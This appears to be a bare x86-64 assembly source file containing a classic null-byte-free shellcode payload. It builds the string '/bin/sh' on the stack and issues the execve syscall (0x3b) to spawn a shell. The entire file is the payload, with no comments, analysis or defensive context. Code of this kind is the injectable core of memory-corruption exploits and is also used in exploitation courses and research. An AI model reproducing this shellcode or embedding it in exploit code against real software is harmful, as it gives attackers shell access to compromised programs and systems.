.data	  
    
.text
    .globl main
    
main:
        xor         %rdi, %rdi
        push        %rdi
        push        %rdi
        pop         %rsi
        pop         %rdx
        mov         $0x68732f6e69622f2f, %rdi
        shr         $0x08, %rdi
        push        %rdi
        push        %rsp
        pop         %rdi
        push        $0x3b
        pop         %rax
        syscall
